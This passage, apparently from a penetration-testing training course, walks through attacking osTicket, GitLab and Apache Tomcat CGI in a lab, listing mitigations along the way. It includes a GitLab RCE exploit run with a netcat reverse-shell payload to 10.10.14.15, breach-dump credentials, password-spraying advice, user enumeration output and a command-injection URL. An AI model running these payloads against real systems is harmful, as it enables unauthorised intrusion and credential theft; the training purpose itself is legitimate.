<p>Now, if we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, <code>940288@inlanefreight.local</code>, would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/ost\_tickets.png" alt=""></p>
<hr>
<h3 id="osticket-sensitive-data-exposure">osTicket - Sensitive Data Exposure</h3>
<p>Let&#39;s say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool <a href="http://dehashed.com/">Dehashed</a> (for our purposes, the sample data below is fictional).</p>
<p>osTicket</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

<span class="hljs-string">id :</span> <span class="hljs-number">5996447501</span>
<span class="hljs-string">email :</span> julie.clayton<span class="hljs-meta">@inlanefreight</span>.local
<span class="hljs-string">username :</span> jclayton
<span class="hljs-string">password :</span> JulieC8765!
<span class="hljs-string">hashed_password :</span> 
<span class="hljs-string">name :</span> Julie Clayton
<span class="hljs-string">vin :</span> 
<span class="hljs-string">address :</span> 
<span class="hljs-string">phone :</span> 
<span class="hljs-string">database_name :</span> ModBSolutions


<span class="hljs-string">id :</span> <span class="hljs-number">7344467234</span>
<span class="hljs-string">email :</span> kevin<span class="hljs-meta">@inlanefreight</span>.local
<span class="hljs-string">username :</span> kgrimes
<span class="hljs-string">password :</span> Fish1ng_s3ason!
<span class="hljs-string">hashed_password :</span> 
<span class="hljs-string">name :</span> Kevin Grimes
<span class="hljs-string">vin :</span> 
<span class="hljs-string">address :</span> 
<span class="hljs-string">phone :</span> 
<span class="hljs-string">database_name :</span> MyFitnessPal

&lt;SNIP&gt;
</code></pre>
<p>This dump shows cleartext passwords for two different users: <code>jclayton</code> and <code>kgrimes</code>. At this point, we have also performed subdomain enumeration and come across several interesting ones.</p>
<p>osTicket</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat ilfreight_subdomains

vpn<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
support<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
ns1<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
mail<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
apps<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
ftp<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
ir<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
auth<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
careers<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
portal-stage<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
dns1<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
dns2<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
meet<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
portal-test<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
home<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
legacy<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
</code></pre>
<p>We browse to each subdomain and find that many are defunct, but the <code>support.inlanefreight.local</code> and <code>vpn.inlanefreight.local</code> are active and very promising. <code>Support.inlanefreight.local</code> is hosting an osTicket instance, and <code>vpn.inlanefreight.local</code> is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/osticket\_admin.png" alt=""></p>
<p>Let&#39;s try the credentials for <code>jclayton</code>. No luck. We then try the credentials for <code>kgrimes</code> and have no success but noticing that the login page also accepts an email address, we try <code>kevin@inlanefreight.local</code> and get a successful login!</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/osticket\_kevin.png" alt=""></p>
<p>The user <code>kevin</code> appears to be a support agent but does not have any open tickets. Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/osticket\_ticket.png" alt=""></p>
<p>The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password (solid security awareness!). The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it.</p>
<p>Furthermore, the support agent states that this is the standard password given to new joiners and sets the user&#39;s password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. Though out of the scope of this module, in this scenario, it would be worth using tools like <a href="https://github.com/initstring/linkedin2username">linkedin2username</a> to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password.</p>
<p>Many applications such as osTicket also contain an address book. It would also be worth exporting all emails/usernames from the address book as part of our enumeration as they could also prove helpful in an attack such as password spraying.</p>
<hr>
<h3 id="closing-thoughts">Closing Thoughts</h3>
<p>Though this section showcased some fictional scenarios, they are based on things we are likely to see in the real world. When we come across support portals (especially external), we should test out the functionality and see if we can do things like creating a ticket and having a legitimate company email address assigned to us. From there, we may be able to use the email address to sign in to other company services and gain access to sensitive data.</p>
<p>This section also shows the dangers of password re-use and the kinds of data we may very likely find if we can gain access to a help desk agent&#39;s support ticketing queue. Organizations can prevent this type of information leakage by taking a few relatively easy steps:</p>
<ul>
<li>Limit what applications are exposed externally</li>
<li>Enforce multi-factor authentication on all external portals</li>
<li>Provide security awareness training to all employees and advise them not to use their corporate emails to sign up for third-party services</li>
<li>Enforce a strong password policy in Active Directory and on all applications, disallowing common words such as variations of <code>welcome</code>, and <code>password</code>, the company name, and seasons and months</li>
<li>Require a user to change their password after their initial login and periodically expire user&#39;s passwords</li>
</ul>
<h2 id="gitlab-discovery-enumeration">Gitlab - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://about.gitlab.com/">GitLab</a> is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js. Gitlab was first launched in 2014 and, over the years, has grown into a 1,400 person company with $150 million revenue in 2020. Though the application is free and open-source, they also offer a paid enterprise version. Here are some quick <a href="https://about.gitlab.com/company/">stats</a> about GitLab:</p>
<ul>
<li>At the time of writing, the company has 1,466 employees</li>
<li>Gitlab has over 30 million registered users located in 66 countries</li>
<li>The company publishes most of its internal procedures and OKRs publicly on their website</li>
<li>Some companies that use GitLab include Drupal, Goldman Sachs, Hackerone, Ticketmaster, Nvidia, Siemens, and <a href="https://about.gitlab.com/customers/">more</a></li>
</ul>
<p>GitLab is similar to GitHub and BitBucket, which are also web-based Git repository tools. A comparison between the three can be seen <a href="https://stackshare.io/stackups/bitbucket-vs-github-vs-gitlab">here</a>.</p>
<p>During internal and external penetration tests, it is common to come across interesting data in a company&#39;s GitHub repo or a self-hosted GitLab or BitBucket instance. These Git repositories may just hold publicly available code such as scripts to interact with an API. However, we may also find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. We may also come across SSH private keys. We can attempt to use the search function to search for users, passwords, etc. Applications such as GitLab allow for public repositories (that require no authentication), internal repositories (available to authenticated users), and private repositories (restricted to specific users). It is also worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. Most companies will only allow a user with a company email address to register and require an administrator to authorize the account, but as we&#39;ll see later on, a GitLab instance can be set up to allow anyone to register and then log in.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_signup\_res.png" alt=""></p>
<p>If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_2fa.png" alt=""></p>
<hr>
<h3 id="footprinting-discovery">Footprinting &amp; Discovery</h3>
<p>We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_login.png" alt=""></p>
<p>The only way to footprint the GitLab version number in use is by browsing to the <code>/help</code> page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as <a href="https://www.exploit-db.com/exploits/49821">this</a>. We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab <a href="https://www.exploit-db.com/exploits/48431">12.9.0</a> and GitLab <a href="https://www.exploit-db.com/exploits/49257">11.4.7</a> in the past few years as well as GitLab Community Edition <a href="https://www.exploit-db.com/exploits/49821">13.10.3</a>, <a href="https://www.exploit-db.com/exploits/49944">13.9.3</a>, and <a href="https://www.exploit-db.com/exploits/49951">13.10.2</a>.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>There&#39;s not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to <code>/explore</code> and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called <code>Inlanefreight dev</code>. Public projects can be interesting because we may be able to use them to find out more about the company&#39;s infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_explore.png" alt=""></p>
<p>Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_example.png" alt=""></p>
<p>From here, we can explore each of the pages linked in the top left <code>groups</code>, <code>snippets</code>, and <code>help</code>. We can also use the search functionality and see if we can uncover any other projects. Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_signup.png" alt=""></p>
<p>We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as <code>Dehashed</code> as seen in the osTicket section. Here we can see the user <code>root</code> is taken. We&#39;ll see another example of username enumeration in the next section. On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error <code>1 error prohibited this user from being saved: Email has already been taken</code>. As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the <code>Sign-up enabled</code> checkbox is cleared within the settings page under <code>Sign-up restrictions</code>, we can still browse to the <code>/users/sign_up</code> page and enumerate users but will not be able to register a user.</p>
<p>Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using <code>Fail2Ban</code> to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_taken2.png" alt=""></p>
<p>Let&#39;s go ahead and register with the credentials <code>hacker:Welcome</code> and log in and poke around. As soon as we complete registration, we are logged in and brought to the projects dashboard page. If we go to the <code>/explore</code> page now, we notice that there is now an internal project <code>Inlanefreight website</code> available to us. Digging around a bit, this just seems to be a static website for the company. Suppose this were some other type of application (such as PHP). In that case, we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/gitlab\_internal.png" alt=""></p>
<p>In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this <a href="https://tillsongalloway.com/finding-sensitive-information-on-github/index.html">blog post</a> explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.</p>
<hr>
<h3 id="onwards">Onwards</h3>
<p>This section shows us the importance (and power) of enumeration and that not every single application we uncover has to be directly exploitable to still prove very interesting and useful for us during an engagement. This is especially true on external penetration tests where the attack surface is usually considerably smaller than an internal assessment. We may need to gather data from two or more sources to mount a successful attack.</p>
<h2 id="attacking-gitlab">Attacking GitLab</h2>
<hr>
<p>As we saw in the previous section, even unauthenticated access to a GitLab instance could lead to sensitive data compromise. If we were able to gain access as a valid company user or an admin, we could potentially uncover enough data to fully compromise the organization in some way. GitLab has <a href="https://www.cvedetails.com/vulnerability-list/vendor\_id-13074/Gitlab.html">553 CVEs</a> reported as of September 2021. While not every single one is exploitable, there have been several severe ones over the years that could lead to remote code execution.</p>
<hr>
<h3 id="username-enumeration">Username Enumeration</h3>
<p>Though not considered a vulnerability by GitLab as seen on their <a href="https://hackerone.com/gitlab?type=team">Hackerone</a> page (&quot;User and project enumeration/path disclosure unless an additional impact can be demonstrated&quot;), it is still something worth checking as it could result in access if users are selecting weak passwords. We can do this manually, of course, but scripts make our work much faster. We can write one ourselves in Bash or Python or use <a href="https://www.exploit-db.com/exploits/49821">this one</a> to enumerate a list of valid users. The Python3 version of this same tool can be found <a href="https://github.com/dpgg101/GitLabUserEnum">here</a>. As with any type of password spraying attack, we should be mindful of account lockout and other kinds of interruptions. GitLab&#39;s defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes. This can be seen <a href="https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8\_devise.rb">here</a>. This can be changed, but GitLab would have to be compiled by source. At this time, there is no way to change this setting from the admin UI, but an admin can modify the minimum password length, which could help with users choosing short, common passwords but will not entirely mitigate the risk of password attacks.</p>
<p>Attacking GitLab</p>
<pre><code class="lang-shell-session"># Number <span class="hljs-keyword">of</span> authentication tries before <span class="hljs-keyword">locking</span> an account <span class="hljs-keyword">if</span> lock_strategy
# <span class="hljs-keyword">is</span> failed attempts.
config.maximum_attempts = <span class="hljs-number">10</span>

# Time interval <span class="hljs-keyword">to</span> unlock the account <span class="hljs-keyword">if</span> :time <span class="hljs-keyword">is</span> enabled <span class="hljs-keyword">as</span> unlock_strategy.
config.unlock_in = <span class="hljs-number">10</span>.minutes
</code></pre>
<p>Downloading the script and running it against the target GitLab instance, we see that there are two valid usernames, <code>root</code> (the built-in admin account) and <code>bob</code>. If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as <code>Welcome1</code> or <code>Password123</code>, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.</p>
<p>Attacking GitLab</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./gitlab_userenum.sh <span class="hljs-comment">--url http://gitlab.inlanefreight.local:8081/ --userlist users.txt</span>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                           GitLab User Enumeration Script
                                    Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: <span class="hljs-keyword">Do</span> <span class="hljs-keyword">not</span> run this script against GitLab.com! Also <span class="hljs-keyword">keep</span> <span class="hljs-keyword">in</span> mind that this PoC <span class="hljs-keyword">is</span> meant <span class="hljs-keyword">only</span>
<span class="hljs-keyword">for</span> educational purpose <span class="hljs-keyword">and</span> ethical use. Running it against systems that you <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> own <span class="hljs-keyword">or</span> have the
<span class="hljs-keyword">right</span> permission <span class="hljs-keyword">is</span> totally <span class="hljs-keyword">on</span> your own risk.

Author: @<span class="hljs-number">4</span>DoniiS [https://github.com/<span class="hljs-number">4</span>D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<span class="hljs-keyword">LOOP</span>
<span class="hljs-number">200</span>
[+] The username root <span class="hljs-keyword">exists</span>!
<span class="hljs-keyword">LOOP</span>
<span class="hljs-number">302</span>
<span class="hljs-keyword">LOOP</span>
<span class="hljs-number">302</span>
<span class="hljs-keyword">LOOP</span>
<span class="hljs-number">200</span>
[+] The username bob <span class="hljs-keyword">exists</span>!
<span class="hljs-keyword">LOOP</span>
<span class="hljs-number">302</span>
</code></pre>
<hr>
<h3 id="authenticated-remote-code-execution">Authenticated Remote Code Execution</h3>
<p>Remote code execution vulnerabilities are typically considered the &quot;cream of the crop&quot; as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution <a href="https://hackerone.com/reports/1154542">vulnerability</a> due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this <a href="https://www.exploit-db.com/exploits/49951">exploit</a> to achieve RCE.</p>
<p>As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.</p>
<p>Attacking GitLab</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:<span class="hljs-number">8081</span> -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.10.14.15</span> <span class="hljs-number">8443</span> &gt;/tmp/f '

<span class="hljs-string">[1]</span> Authenticating
Successfully Authenticated
<span class="hljs-string">[2]</span> Creating Payload 
<span class="hljs-string">[3]</span> Creating Snippet and Uploading
<span class="hljs-string">[+]</span> RCE Triggered !!
</code></pre>
<p>And we get a shell almost instantly.</p>
<p>Attacking GitLab</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">8443</span>

listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">8443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.88</span>] <span class="hljs-number">60054</span>

git@app04:~/gitlab-workhorse$ <span class="hljs-built_in">id</span>

<span class="hljs-built_in">id</span>
uid=<span class="hljs-number">996</span>(git) gid=<span class="hljs-number">997</span>(git) groups=<span class="hljs-number">997</span>(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
</code></pre>
<h2 id="attacking-tomcat-cgi">Attacking Tomcat CGI</h2>
<hr>
<p><code>CVE-2019-0232</code> is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the <code>enableCmdLineArguments</code> feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions <code>9.0.0.M1</code> to <code>9.0.17</code>, <code>8.5.0</code> to <code>8.5.39</code>, and <code>7.0.0</code> to <code>7.0.93</code> of Tomcat are affected.</p>
<p>The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.</p>
<p>In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.</p>
<p>CGI scripts are utilised in websites for several reasons, but there are also some pretty big disadvantages to using them:</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>It is simple and effective for generating dynamic web content.</td>
<td>Incurs overhead by having to load programs into memory for each request.</td>
</tr>
<tr>
<td>Use any programming language that can read from standard input and write to standard output.</td>
<td>Cannot easily cache data in memory between page requests.</td>
</tr>
<tr>
<td>Can reuse existing code and avoid writing new code.</td>
<td>It reduces the server&#39;s performance and consumes a lot of processing time.</td>
</tr>
</tbody>
</table>
<p>The <code>enableCmdLineArguments</code> setting for Apache Tomcat&#39;s CGI Servlet controls whether command line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. This feature can make CGI scripts more flexible and easier to write by allowing parameters to be passed to the script without using environment variables or standard input. For example, a CGI script can use command line arguments to switch between actions based on user input.</p>
<p>Suppose you have a CGI script that allows users to search for books in a bookstore&#39;s catalogue. The script has two possible actions: &quot;search by title&quot; and &quot;search by author.&quot;</p>
<p>The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/cgi-bin/booksearch.cgi?action=title&amp;query=the+great+gatsby</span>
</code></pre>
<p>Here, the <code>action</code> parameter is set to <code>title</code>, indicating that the script should search by book title. The <code>query</code> parameter specifies the search term &quot;the great gatsby.&quot;</p>
<p>If the user wants to search by author, they can use a similar URL:</p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/cgi-bin/</span>booksearch.cgi?action=author&amp;query=fitzgerald
</code></pre>
<p>Here, the <code>action</code> parameter is set to <code>author</code>, indicating that the script should search by author name. The <code>query</code> parameter specifies the search term &quot;fitzgerald.&quot;</p>
<p>By using command line arguments, the CGI script can easily switch between different search actions based on user input. This makes the script more flexible and easier to use.</p>
<p>However, a problem arises when <code>enableCmdLineArguments</code> is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.</p>
<p>For instance, an attacker can append <code>dir</code> to a valid command using <code>&amp;</code> as a separator to execute <code>dir</code> on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after <code>&amp;</code> to execute any command on the server. An example of this is <code>http://example.com/cgi-bin/hello.bat?&amp;dir</code>, which passes <code>&amp;dir</code> as an argument to <code>hello.bat</code> and executes <code>dir</code> on the server. As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Scan the target using <code>nmap</code>, this will help to pinpoint active services currently operating on the system. This process will provide valuable insights into the target, discovering what services, and potentially which specific versions are running, allowing for a better understanding of its infrastructure and potential vulnerabilities.</p>
<p><strong>Nmap - Open Ports</strong></p>
<p>Attacking Tomcat CGI</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- -sC -Pn <span class="hljs-number">10.129</span>.<span class="hljs-number">204.227</span> --<span class="hljs-keyword">open</span> 

Starting Nmap <span class="hljs-number">7.93</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">23</span> <span class="hljs-number">13</span>:<span class="hljs-number">57</span> SAST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">204.227</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.17</span>s latency).
Not shown: <span class="hljs-number">63648</span> closed tcp ports (conn-refused), <span class="hljs-number">1873</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)
Some closed ports may <span class="hljs-keyword">be</span> reported <span class="hljs-keyword">as</span> filtered due <span class="hljs-keyword">to</span> --defeat-rst-ratelimit
PORT      STATE SERVICE
<span class="hljs-number">22</span>/tcp    <span class="hljs-keyword">open</span>  ssh
| ssh-hostkey: 
|   <span class="hljs-number">2048</span> ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   <span class="hljs-number">256</span> <span class="hljs-number">382</span>e76cd0594a6e717d1808165262544 (ECDSA)
|_  <span class="hljs-number">256</span> <span class="hljs-number">35096912230</span>f11bc546fddf797bd6150 (ED25519)
<span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc
<span class="hljs-number">139</span>/tcp   <span class="hljs-keyword">open</span>  netbios-ssn
<span class="hljs-number">445</span>/tcp   <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span>
<span class="hljs-number">5985</span>/tcp  <span class="hljs-keyword">open</span>  wsman
<span class="hljs-number">8009</span>/tcp  <span class="hljs-keyword">open</span>  ajp13
| ajp-method<span class="hljs-variable">s:</span> 
|_  Supported method<span class="hljs-variable">s:</span> GET HEAD POST OPTIONS
<span class="hljs-number">8080</span>/tcp  <span class="hljs-keyword">open</span>  http-proxy
|_http-title: Apache Tomcat/<span class="hljs-number">9.0</span>.<span class="hljs-number">17</span>
|_http-favicon: Apache Tomcat
<span class="hljs-number">47001</span>/tcp <span class="hljs-keyword">open</span>  winrm

Host script result<span class="hljs-variable">s:</span>
| smb2-time: 
|   date: <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">23</span>T11:<span class="hljs-number">58</span>:<span class="hljs-number">42</span>
|_  start_date: <span class="hljs-keyword">N</span>/A
| smb2-security-<span class="hljs-keyword">mode</span>: 
|   <span class="hljs-number">311</span>: 
|_    Message signing enabled but not required

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">165.25</span> seconds
</code></pre>
<p>Here we can see that Nmap has identified <code>Apache Tomcat/9.0.17</code> running on port <code>8080</code> running.</p>
<p><strong>Finding a CGI script</strong></p>
<p>One way to uncover web server content is by utilising the <code>ffuf</code> web enumeration tool along with the <code>dirb common.txt</code> wordlist. Knowing that the default directory for CGI scripts is <code>/cgi</code>, either through prior knowledge or by researching the vulnerability, we can use the URL <code>http://10.129.204.227:8080/cgi/FUZZ.cmd</code> or <code>http://10.129.204.227:8080/cgi/FUZZ.bat</code> to perform fuzzing.</p>
<p><strong>Fuzzing Extentions - .CMD</strong></p>
<p>Attacking Tomcat CGI</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd


        /'___<span class="hljs-symbol">\ </span> /'___<span class="hljs-symbol">\ </span>          /'___<span class="hljs-symbol">\ </span>      
       /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/ /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/  __  __  /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/       
       <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\ </span>     
        <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/ <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/      
         <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>___/  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>      
          <span class="hljs-symbol">\/</span>_/    <span class="hljs-symbol">\/</span>_/   <span class="hljs-symbol">\/</span>___/    <span class="hljs-symbol">\/</span>_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
</code></pre>
<p>Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.</p>
<p><strong>Fuzzing Extentions - .BAT</strong></p>
<p>Attacking Tomcat CGI</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


        /'___<span class="hljs-symbol">\ </span> /'___<span class="hljs-symbol">\ </span>          /'___<span class="hljs-symbol">\ </span>      
